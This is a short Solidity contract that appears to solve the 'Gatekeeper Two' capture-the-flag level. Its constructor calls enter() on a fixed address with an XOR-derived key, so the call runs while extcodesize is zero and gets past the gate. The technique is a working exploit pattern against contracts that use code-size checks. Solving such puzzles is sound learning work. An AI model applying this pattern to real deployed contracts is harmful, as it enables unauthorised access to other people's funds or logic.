// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// I may or may not have tinkered a bit with call types
// to see if caller() could be different than msg.sender
// in some case and only then went to the yellow paper,
// looked for "extcodesize" and realizing that it must
// be 0 when the contract is being initialized.

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoExploit {
    constructor () {
        IGatekeeperTwo gatekeeper = IGatekeeperTwo(0x3895a91f96C435a6Fda15A557c181A6D73903Cda);

        // since XOR is its own inverse, we can do that:
        gatekeeper.enter(bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max));
    }
}
